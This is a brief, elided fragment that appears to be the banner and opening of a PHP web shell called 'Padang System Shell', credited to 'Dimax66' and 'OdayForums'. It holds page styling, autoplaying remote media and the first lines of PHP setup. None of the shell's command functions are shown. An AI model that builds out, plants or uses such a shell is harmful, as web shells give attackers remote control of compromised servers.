...
body {
  ...
  background:url();
background-image: url(https://kosred.com/a/nfqdbt.jpg);
...
<center>
<font face="Bungee" size="6">Padang System Shell</font></center>
...
<title="Dimax66" alt="OdayForums" class="center" />
        ...
        <audio src="https://kosred.com/a/etapcc.mp3" loop="1" controls="1" autoplay="1"></audio><br>
<br><br><br>
<?php
set_time_limit(0);
error_reporting(0);
